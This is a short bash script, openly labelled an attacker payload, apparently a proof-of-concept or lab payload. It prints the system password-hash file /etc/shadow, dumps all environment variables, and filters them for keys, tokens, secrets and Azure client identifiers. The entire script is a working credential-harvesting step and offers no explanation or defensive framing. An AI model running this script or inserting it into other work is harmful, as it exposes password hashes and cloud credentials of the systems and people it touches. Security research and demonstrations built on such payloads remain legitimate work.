#!/bin/bash

echo "[+] ATTACKER PAYLOAD STARTED"

echo "[*] /etc/shadow:"
cat /etc/shadow

echo "[*] ENVIRONMENT VARIABLES:"
env

echo "[*] Searching for secrets:"
env | grep -Ei 'key|token|secret|azure|client|id'

echo "[+] ATTACK COMPLETE"
